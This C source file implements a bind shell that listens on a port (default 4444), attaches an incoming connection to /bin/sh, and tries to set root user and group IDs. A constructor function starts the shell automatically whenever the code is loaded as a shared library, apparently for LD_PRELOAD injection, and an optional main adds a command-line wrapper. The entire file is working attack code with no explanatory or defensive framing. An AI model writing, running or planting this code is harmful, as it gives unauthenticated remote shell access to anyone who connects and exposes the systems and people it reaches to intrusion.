#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

static void bind_shell(int port) {
    fprintf(stderr, "[+] Starting bind shell on port %d\n", port);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "[-] Failed to create socket: %s\n", strerror(errno));
        return;
    }
    
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[-] Failed to bind to port %d: %s\n", port, strerror(errno));
        close(sockfd);
        return;
    }
    
    if (listen(sockfd, 1) < 0) {
        fprintf(stderr, "[-] Failed to listen: %s\n", strerror(errno));
        close(sockfd);
        return;
    }
    
    fprintf(stderr, "[+] Listening on 0.0.0.0:%d\n", port);
    fprintf(stderr, "[+] Waiting for connection...\n");
    
    int client = accept(sockfd, NULL, NULL);
    if (client < 0) {
        fprintf(stderr, "[-] Failed to accept connection: %s\n", strerror(errno));
        close(sockfd);
        return;
    }
    
    fprintf(stderr, "[+] Connection accepted, spawning shell\n");
    
    dup2(client, 0);
    dup2(client, 1);
    dup2(client, 2);
    close(client);
    close(sockfd);
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    unsetenv("LD_PRELOAD");
    
    execl("/bin/sh", "sh", NULL);
    fprintf(stderr, "[-] Failed to execute shell: %s\n", strerror(errno));
}

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_BIND_ACTIVE")) return;
    if (getenv("SHELL_BIND_MAIN")) return;
    
    setenv("SHELL_BIND_ACTIVE", "1", 1);
    const char* port_str = getenv("BIND_PORT");
    int port = port_str ? atoi(port_str) : 4444;
    bind_shell(port);
}

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
    setenv("SHELL_BIND_MAIN", "1", 1);
    setenv("SHELL_BIND_ACTIVE", "1", 1);
    
    int port = 4444;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-bind - Bind shell utility\n");
            printf("Usage: %s [options] [port]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -p <port>     Port to bind (default: 4444)\n");
            printf("\nExamples:\n");
            printf("  %s              # Bind on port 4444\n", argv[0]);
            printf("  %s 8080         # Bind on port 8080\n", argv[0]);
            printf("  %s -p 1337      # Bind on port 1337\n", argv[0]);
            printf("\nEnvironment:\n");
            printf("  BIND_PORT=<port>  Set bind port (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            port = atoi(argv[++i]);
        } else if (argv[i][0] != '-') {
            port = atoi(argv[i]);
        }
    }
    
    const char* env_port = getenv("BIND_PORT");
    if (argc == 1 && env_port) {
        port = atoi(env_port);
    }
    
    bind_shell(port);
    return 0;
}
#endif